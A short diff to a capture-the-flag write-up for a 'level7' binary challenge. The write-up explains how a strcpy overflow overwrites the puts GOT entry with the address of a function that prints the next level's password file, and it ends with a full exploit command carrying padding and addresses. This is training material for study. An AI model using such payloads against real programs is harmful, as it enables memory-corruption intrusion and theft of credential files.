@@ -1,5 +1,5 @@
 We have an executable that we disass with Ghidra as allways.
-we've got this main:
+we ve got this main:
 
 void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)
 {
@@ -69,6 +69,8 @@ Dump of assembler code for function puts@plt:
 so we need to have this now:
 
 strcpy( 20 bytes + addr GOT, addr of m() )
+
+we want to call m because in m, we have a printf who show c and c = __stream = fopen("/home/user/level8/.pass","r");
 
 ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"')  $(python -c 'print"\xf4\x84\x04\x08"')
 
